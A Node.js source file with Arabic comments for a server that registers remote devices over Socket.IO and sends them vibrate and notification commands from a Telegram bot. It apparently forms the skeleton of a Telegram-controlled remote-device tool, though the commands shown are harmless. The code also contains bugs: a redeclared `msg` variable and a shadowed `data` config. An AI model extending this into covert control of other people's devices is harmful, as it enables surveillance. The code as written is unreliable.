const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// قراءة الإعدادات
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    transports: ['websocket', 'polling'] // الأهم: تحديد نوع النقل
});

const bot = new telegramBot(data.token, { polling: true });
const connectedDevices = new Map();

// ========== عند بدء البوت ==========
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(data.id, '✅ Bot is ready!', {
        reply_markup: {
            keyboard: [
                ['📱 Devices'],
                ['📳 Vibrate'],
                ['🔔 Test Notification']
            ],
            resize_keyboard: true
        }
    });
});

// ========== عرض الأجهزة ==========
bot.onText(/📱 Devices/, (msg) => {
    if (connectedDevices.size === 0) {
        bot.sendMessage(data.id, '❌ No devices connected');
        return;
    }
    let msg = '📱 Connected devices:\n';
    for (const [id, device] of connectedDevices) {
        msg += `- ${device.name} (${device.model})\nID: ${id}\n`;
    }
    bot.sendMessage(data.id, msg);
});

// ========== أمر الاهتزاز ==========
bot.onText(/📳 Vibrate/, (msg) => {
    if (connectedDevices.size === 0) {
        bot.sendMessage(data.id, '❌ No devices connected');
        return;
    }
    const [deviceId] = connectedDevices.keys();
    console.log(`📳 Sending vibrate to: ${deviceId}`);
    io.to(deviceId).emit('command', { request: 'vibrate' });
    bot.sendMessage(data.id, `📳 Vibrate command sent to ${connectedDevices.get(deviceId).name}`);
});

// ========== أمر اختبار ==========
bot.onText(/🔔 Test Notification/, (msg) => {
    if (connectedDevices.size === 0) {
        bot.sendMessage(data.id, '❌ No devices connected');
        return;
    }
    const [deviceId] = connectedDevices.keys();
    io.to(deviceId).emit('command', { request: 'notification', text: 'Hello from server!' });
    bot.sendMessage(data.id, '🔔 Test notification sent!');
});

// ========== اتصال Socket.IO ==========
io.on('connection', (socket) => {
    console.log('🔌 New socket connection:', socket.id);
    
    const deviceName = socket.handshake.headers['device-name'] || 'Unknown';
    const deviceModel = socket.handshake.headers['device-model'] || 'Unknown';
    
    connectedDevices.set(socket.id, { name: deviceName, model: deviceModel });
    console.log(`✅ Device connected: ${deviceName} (${deviceModel})`);
    bot.sendMessage(data.id, `✅ Device connected: ${deviceName}`);

    // استقبال الأوامر من الجهاز (للتأكد من أن الجهاز يستقبل)
    socket.on('command', (data) => {
        console.log(`📩 Command from device: ${JSON.stringify(data)}`);
        bot.sendMessage(data.id, `📩 Device received: ${data.request}`);
    });

    // استقبال أي حدث آخر
    socket.onAny((event, ...args) => {
        console.log(`📡 Event received: ${event}`, args);
    });

    socket.on('disconnect', () => {
        connectedDevices.delete(socket.id);
        console.log('❌ Device disconnected');
        bot.sendMessage(data.id, '❌ Device disconnected');
    });
});

app.get('/ping', (req, res) => res.send('pong'));

const PORT = process.env.PORT || 8080;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ Bot is ready!`);
});
